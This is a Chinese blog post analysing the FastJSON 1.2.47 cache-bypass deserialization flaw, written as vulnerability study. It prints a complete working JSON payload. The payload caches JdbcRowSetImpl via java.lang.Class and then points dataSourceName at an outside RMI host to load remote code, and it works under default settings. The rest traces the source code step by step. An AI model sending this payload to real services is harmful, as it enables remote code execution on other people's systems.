---
title: 代码审计 | FastJSON 1.2.47 缓存绕过漏洞分析
cover: 'https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image2.png'
categories:
  - [代码审计, fastjson]
tags:
  - 代码审计
  - FastJson
  - Java
  - 反序列化
abbrlink: 5ef1061b
date: 2026-03-26 10:00:00
---

> 1.2.47 的缓存绕过不需要开任何开关，默认配置就能打，危害最大。

---

## 目录

- [环境准备](#环境准备)
- [漏洞概述](#漏洞概述)
- [Payload 结构解析](#payload-结构解析)
- [源码跟踪：一步步看绕过过程](#源码跟踪一步步看绕过过程)
  - [第一阶段：处理字段 a，预热缓存](#第一阶段处理字段-a预热缓存)
  - [第二阶段：处理字段 b，命中缓存绕过检测](#第二阶段处理字段-b命中缓存绕过检测)
- [总结](#总结)

---

## 环境准备

版本：**1.2.47**

使用 Maven 管理依赖，在 `pom.xml` 里改一下版本号就行。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image1.png)

---

## 漏洞概述

先看一下 Payload 的样子：

```java
String payload =
    "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
    "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
    "\"dataSourceName\":\"rmi://172.16.250.1:1099/nmpjlh\"," +
    "\"autoCommit\":true}}";
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image2.png)

> **1.2.47 最厉害的地方在哪？**
>
> 前面 1.2.25、1.2.42、1.2.43 那些版本的绕过，都需要手动把 `autoTypeSupport` 设置为 `true` 才能打。但是 **1.2.47 的缓存绕过不需要开任何开关**，默认配置就能打，所以危害是最大的。
>
> 原因在于：`autoTypeSupport` 这个开关是进入黑白名单检测的前提条件，但 1.2.47 利用的是**缓存机制**——缓存的查找发生在黑白名单检测**之前**，所以压根就没进到检测分支，直接 return 了，完全绕过了整个检测逻辑。这也是为什么换成低版本的 Fastjson 同样可行，是一个通杀的 Payload。

---

## Payload 结构解析

完整 Payload 长这样：

```json
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.16.250.1:1099/nmpjlh",
    "autoCommit": true
  }
}
```

分两部分，各有各的作用：

### 第一部分 `a`：往缓存里塞东西

```json
"@type": "java.lang.Class"
"val": "com.sun.rowset.JdbcRowSetImpl"
```

- `java.lang.Class` 是 JDK 自带类，不在黑名单里，`checkAutoType` 直接放行。
- Fastjson 在反序列化 `java.lang.Class` 的时候，会读取 `val` 字段的值，在内部调用 `Class.forName("com.sun.rowset.JdbcRowSetImpl")`，然后把这个结果**存进 `mappings` 缓存**。

### 第二部分 `b`：从缓存里取出来用

```json
"@type": "com.sun.rowset.JdbcRowSetImpl"
```

- 正常情况下，`com.sun.rowset.JdbcRowSetImpl` 在黑名单里，`checkAutoType` 应该直接抛异常。
- 但是 `checkAutoType` 在做黑名单检测之前，**会先查一遍缓存**：

```java
clazz = TypeUtils.getClassFromMapping(typeName);
if (clazz != null) {
    return clazz; // 缓存命中，直接返回，不走黑名单
}
```

- 第一部分已经把 `JdbcRowSetImpl` 存进缓存了，所以这里直接命中，跳过了黑名单检测，类加载成功，后续触发 RCE。

> **一句话总结：**
> 用 `java.lang.Class` 把恶意类"预热"进缓存，再用 `@type` 直接从缓存取，从而绕过黑名单检测。

---

## 源码跟踪：一步步看绕过过程

下面开始跟链（调试源码），把整个流程走一遍。

### 第一阶段：处理字段 a，预热缓存

首先来到 `@type` 的判断逻辑。此时处理的是字段 `a`，判断类型不符合直接跳过的条件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image3.png)

于是进入了 `else` 分支，跳过了这一层。

---

接着再次进入 `@type` 判断函数，这次判断的是 `a` 里面 `@type` 的值（即 `java.lang.Class`）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image4.png)

检测到 `a` 的 `@type`，进入检测函数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image5.png)

因为 `java.lang.Class` 是正常的 JDK 类，所以直接放行返回：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image6.png)

---

接下来进入反序列化函数内部：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image7.png)

然后走到了 `loadClass`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image8.png)

这里 `strVal` 的值就是 `com.sun.rowset.JdbcRowSetImpl`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image9.png)

注意这里有个关键细节：**返回值里 `cache` 是硬编码的 `true`**：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image10.png)

所以会进入第二个缓存的写入逻辑，把 `com.sun.rowset.JdbcRowSetImpl` 存入 `mappings` 缓存：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image11.png)

到这里，第一阶段完成，缓存已经预热好了。

---

### 第二阶段：处理字段 b，命中缓存绕过检测

开始读取字段 `b` 的内容：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image12.png)

读取到 `typeName = com.sun.rowset.JdbcRowSetImpl`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image13.png)

进入 `checkAutoType` 检测函数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image14.png)

函数开头有几个固定的快速检测（hash 校验），`com.sun.rowset.JdbcRowSetImpl` 不会在这里触发：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image15.png)

再往后走，这里本来会触发对 `com.sun` 的黑白名单检测：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image16.png)

**但是！** 在进到黑名单检测之前，有一步从缓存里取值的操作：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image17.png)

由于第一阶段已经把 `com.sun.rowset.JdbcRowSetImpl` 存入了缓存，这里直接命中，返回了缓存中的 class：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image18.png)

此时 `class` 的值已经是 `com.sun.rowset.JdbcRowSetImpl`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image19.png)

`class` 不为空，所以不会进入黑白名单的检测分支：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image20.png)

条件不成立，直接返回 `class`，值为 `com.sun.rowset.JdbcRowSetImpl`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image21.png)

退出 `checkAutoType` 检测，`class` 依然是 `com.sun.rowset.JdbcRowSetImpl`，成功绕过了检测机制：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/47_image22.png)

接下来就是常规流程了：通过反射调用 `setter` 方法，触发 `dataSourceName` 赋值，连接 RMI 服务端，执行远程的恶意代码，最终完成 RCE。

---

## 总结

1.2.47 的缓存绕过整体逻辑很清晰，核心就是利用了 Fastjson 内部 `mappings` 缓存的查找顺序早于黑名单检测这个设计缺陷。

整个攻击链分两步走：
1. **用 `java.lang.Class` 做跳板**，借助它不在黑名单的特性，把目标恶意类悄悄存进缓存。
2. **直接从缓存取**，绕过后续的所有黑名单检测，加载恶意类触发 RCE。

这个漏洞影响范围极广，也是学 Fastjson 漏洞历史必须要搞懂的一个版本。
